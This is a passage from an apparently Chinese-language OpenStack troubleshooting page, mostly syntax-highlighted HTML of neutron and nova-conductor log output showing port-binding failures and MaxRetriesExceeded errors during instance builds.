style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '328a483e-a346-448c-9c45-c26fd0162754',</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'segmentation_id':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'physical_network':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> None,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'id':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'e11308a4-d612-4604-851a-8aa90754885d',</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'network_type':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> u'vxlan'}]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:17:30.612</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 27477</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.managers</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-c117507f-a7fd-452d-a0a3-fcf928c7d115 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">66c4a34b461444afac62a6c7416c109b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> df1082a78def4615a858b64a6c12c198</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Failed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bind</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 6c119e38-8772-49f4-ada1-a4d8ae3073fd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compute</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vnic_type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> normal</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> using</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> segments</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [{</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'network_id'</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '328a483e-a346-448c-9c45-c26fd0162754',</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'segmentation_id':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'physical_network':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> None,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'id':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'e11308a4-d612-4604-851a-8aa90754885d',</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'network_type':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> u'vxlan'}]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:17:30.635</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 27477</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.managers</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-c117507f-a7fd-452d-a0a3-fcf928c7d115 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">66c4a34b461444afac62a6c7416c109b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> df1082a78def4615a858b64a6c12c198</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Failed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bind</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 6c119e38-8772-49f4-ada1-a4d8ae3073fd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compute</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vnic_type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> normal</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> using</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> segments</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [{</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'network_id'</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '328a483e-a346-448c-9c45-c26fd0162754',</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'segmentation_id':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'physical_network':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> None,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'id':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'e11308a4-d612-4604-851a-8aa90754885d',</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'network_type':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> u'vxlan'}]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其他日志文件</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@controller neutron]# grep ERROR linuxbridge-agent.log </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@controller neutron]# grep ERROR l3-agent.log </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@controller neutron]# grep ERROR dhcp-agent.log </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@controller neutron]# grep ERROR metadata-agent.log</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>nova 日志分析</h4>
<p>nova-conductor.log</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:09:49.570</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22881</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> WARNING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> oslo_config.cfg</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-33860c7c-9b1f-4b2d-a0f1-401ac21d43d0 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">83b70ce8339e4673ae33edf613291108</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> b91453e898d2402495f54b8533bc</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">002b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "url"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "neutron"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> deprecated</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> removal</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (Endpoint </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">lookup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> uses</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> t</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">he</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> service</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> catalog</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> via</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> common</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> keystoneauth1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Adapter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> configuration</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> options.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> In</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> current</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> release,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "url"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> will</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> override</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> this</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> behavior,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> but</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> will</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> be</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ignored</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> removed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> future</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> release.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> To</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> achieve</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> same</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> result,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> endpoint_override</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> instead.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">).  Its value may be silently ignored in the future.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:11:31.636</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22880</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nova.scheduler.utils</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-fe2b1525-0dc9-44ef-8ac1-013fc083323f </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">83b70ce8339e4673ae33edf613291108</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> b91453e898d2402495f54b853</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">3bc002b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [instance: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">a9f3b569-708e-4a56-8f57-51e17924a1bc]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Error</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> last</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">): [u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'Traceback (most recent call last):\n'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'  File "/usr/lib/python2.7/site-packages/nova/compute/manager.py", line 1862, in _do_build_and_run</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">_instance\n    filter_properties, request_spec)\n'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'  File "/usr/lib/python2.7/site-packages/nova/compute/manager.py", line 2142, in _build_and_run_instanc</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">e\n    instance_uuid=instance.uuid, reason=six.text_type(e))\n'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'RescheduledException: Build of instance a9f3b569-708e-4a56-8f57-51e17924a1bc was re-schedu</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">led: Binding failed for port b924b7e9-0dfc-41a5-860a-4c0002fc7c68, please check neutron logs for more information.\n'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:11:31.638</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22880</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> WARNING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nova.scheduler.utils</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-fe2b1525-0dc9-44ef-8ac1-013fc083323f </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">83b70ce8339e4673ae33edf613291108</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> b91453e898d2402495f54b8</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">533bc002b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Failed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compute_task_build_instances:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Exceeded</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> maximum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> number</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> retries.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Ex</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">hausted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> all</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hosts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> available</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> retrying</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> failures</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a9f3b569-708e-4a56-8f57-51e17924a1bc.:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MaxRetriesExceeded:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Exceeded</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> maximum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> number</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> re</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tries.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Exhausted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> all</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hosts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> available</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> retrying</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> failures</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a9f3b569-708e-4a56-8f57-51e17924a1bc.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:11:31.638</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22880</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> WARNING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nova.scheduler.utils</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-fe2b1525-0dc9-44ef-8ac1-013fc083323f </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">83b70ce8339e4673ae33edf613291108</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> b91453e898d2402495f54b8</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">533bc002b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [instance: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">a9f3b569-708e-4a56-8f57-51e17924a1bc]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Setting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sta</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">te.:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MaxRetriesExceeded:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Exceeded</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> maximum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> number</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> retries.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Exhausted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> all</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hosts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> available</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> retrying</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> failures</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a9f3b569-708e-4a56-8f57-5</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1e17924a1bc.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:17:33.047</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22878</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nova.scheduler.utils</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-47aa5b56-67c2-4dd3-9491-077d0bc12a11 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">83b70ce8339e4673ae33edf613291108</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> b91453e898d2402495f54b853</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">3bc002b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [instance: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">3c141ca8-0545-4627-af9b-30c84ec3454b]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Error</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> last</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">): [u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'Traceback (most recent call last):\n'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'  File "/usr/lib/python2.7/site-packages/nova/compute/manager.py", line 1862, in _do_build_and_run</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">_instance\n    filter_properties, request_spec)\n'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'  File "/usr/lib/python2.7/site-packages/nova/compute/manager.py", line 2142, in _build_and_run_instanc</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">e\n    instance_uuid=instance.uuid, reason=six.text_type(e))\n'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'RescheduledException: Build of instance 3c141ca8-0545-4627-af9b-30c84ec3454b was re-schedu</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">led: Binding failed for port 6c119e38-8772-49f4-ada1-a4d8ae3073fd, please check neutron logs for more information.\n'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:17:33.048</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22878</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> WARNING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nova.scheduler.utils</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-47aa5b56-67c2-4dd3-9491-077d0bc12a11 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">83b70ce8339e4673ae33edf613291108</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> b91453e898d2402495f54b8</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">533bc002b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Failed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> compute_task_build_instances:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Exceeded</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> maximum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> number</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> retries.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Ex</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">hausted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> all</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hosts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> available</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> retrying</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> failures</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3c141ca8-0545-4627-af9b-30c84ec3454b.:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MaxRetriesExceeded:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Exceeded</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> maximum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> number</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> re</span></span>
